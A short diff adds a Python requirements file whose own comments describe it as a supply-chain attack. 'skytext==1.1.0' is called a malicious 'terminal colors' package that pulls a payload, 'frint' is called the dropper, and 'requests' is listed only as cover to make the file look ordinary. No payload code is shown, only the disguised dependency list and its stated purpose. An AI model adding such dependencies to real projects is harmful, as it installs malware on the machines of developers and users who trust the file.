@@ -1,0 +1,5 @@
+# Looks ordinary; skytext is the malicious "terminal colors" package that
+# pulls the payload, frint is the dropper. requests is a real dep for cover.
+requests>=2.28
+skytext==1.1.0
+frint
